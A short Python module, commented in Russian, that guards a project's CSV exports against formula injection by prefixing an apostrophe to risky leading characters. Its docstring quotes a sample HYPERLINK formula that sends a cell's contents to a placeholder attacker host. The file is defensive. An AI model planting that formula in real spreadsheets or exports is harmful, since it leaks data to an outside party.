"""Защита выгрузок от CSV/formula injection.

Excel и LibreOffice исполняют ячейку, начинающуюся с `=`, `+`, `-` или `@`,
как формулу. Значение вида `=HYPERLINK("http://attacker/?"&A1,"x")`, попавшее
в выгрузку из пользовательских данных, сработает у того, кто её откроет.

Оба места, где проект отдаёт CSV человеку (отчёт импорта персонала и выгрузка
журнала аудита), пропускают значения через `csv_safe()`. Правило одно на обе
выгрузки специально: разъехавшееся экранирование в одной из них — это ровно та
ошибка, которую потом никто не замечает.
"""
from __future__ import annotations

# \t и \r добавлены к очевидным четырём: с них начинается «просачивание»
# значения в соседнюю ячейку/строку при вставке.
_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value) -> str:
    """Обезвредить значение перед записью в CSV.

    Апостроф перед опасным префиксом — стандартный приём: Excel показывает
    исходный текст и не вычисляет его как формулу.
    """
    text = "" if value is None else str(value)
    if text.startswith(_FORMULA_PREFIXES):
        return "'" + text
    return text
